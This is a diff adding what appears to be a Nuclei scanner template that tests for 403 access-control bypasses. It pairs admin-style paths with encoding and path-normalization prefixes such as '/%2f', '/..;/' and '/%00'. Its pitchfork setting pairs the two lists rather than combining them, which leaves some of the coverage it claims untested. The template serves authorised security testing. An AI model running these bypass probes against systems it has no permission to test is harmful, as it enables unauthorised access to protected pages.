@@ -1,0 +1,109 @@
+id: path-bypass-encoding-candidates
+
+info:
+  name: URL Encoding And Path Normalization 403 Bypass Candidates
+  author: p3i
+  severity: high
+  description: >
+    Tests whether path-based access controls can be bypassed via URL encoding,
+    double-slash prefixes, dot-segment traversal, or case-sensitivity tricks.
+    Compares a clean request (must return 403 Forbidden) to the same path with
+    bypass variants — only reports when the status changes from 403 to 2xx.
+    Common in applications where the WAF or reverse proxy normalizes the path
+    before forwarding but the upstream application server does not, creating a
+    discrepancy in what path is being "secured." Also effective against
+    middleware that checks the raw URL before decoding but routes the decoded URL.
+  reference:
+    - https://portswigger.net/web-security/access-control/bypassing-ip-based-controls
+    - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses
+  tags: misconfig,403,bypass,encoding,path,access-control,web
+  metadata:
+    max-request: 168
+
+http:
+  - raw:
+      # Baseline: plain request — must return 403 to qualify as access-controlled
+      - |
+        GET /{{admin_path}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+      # Bypass variant — path encoding tricks applied to the same protected path
+      - |
+        GET /{{bypass_prefix}}{{admin_path}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    payloads:
+      admin_path:
+        - "admin"
+        - "admin/"
+        - "administrator"
+        - "api/admin"
+        - "api/internal"
+        - "api/private"
+        - "internal"
+        - "private"
+        - "management"
+        - "backend"
+        - "console"
+        - "api/v1/admin"
+
+      bypass_prefix:
+        - "/"
+        - "//"
+        - "/./"
+        - "/%2f"
+        - "/%252f"
+        - "%09"
+        - "/;"
+        - "/..;/"
+        - "/%20"
+        - "/%00"
+        - "/~"
+        - "/../"
+        - "/.%00"
+
+    attack: pitchfork
+    req-condition: true
+    redirects: false
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      # Baseline MUST be 403 — otherwise the path is already public (not a bypass)
+      - type: dsl
+        dsl:
+          - "status_code_1 == 403"
+
+      # Bypass MUST return success (2xx) or a meaningful redirect
+      - type: dsl
+        dsl:
+          - "status_code_2 >= 200 && status_code_2 < 400"
+
+      # Status must have changed — both can't be 403
+      - type: dsl
+        dsl:
+          - "status_code_1 != status_code_2"
+
+      # The bypass response must not be a generic error or login page
+      - type: dsl
+        dsl:
+          - "!contains(tolower(body_2), 'access denied') && !contains(tolower(body_2), 'page not found') && !contains(tolower(body_2), 'not found')"
+
+    extractors:
+      - type: dsl
+        name: baseline_status
+        dsl:
+          - "status_code_1"
+      - type: dsl
+        name: bypass_status
+        dsl:
+          - "status_code_2"
+      - type: dsl
+        name: bypass_path
+        dsl:
+          - "'/' + bypass_prefix + admin_path"
+      - type: regex
+        part: body_2
+        regex:
+          - "(?i)(<title>[^<]{1,120}</title>)"
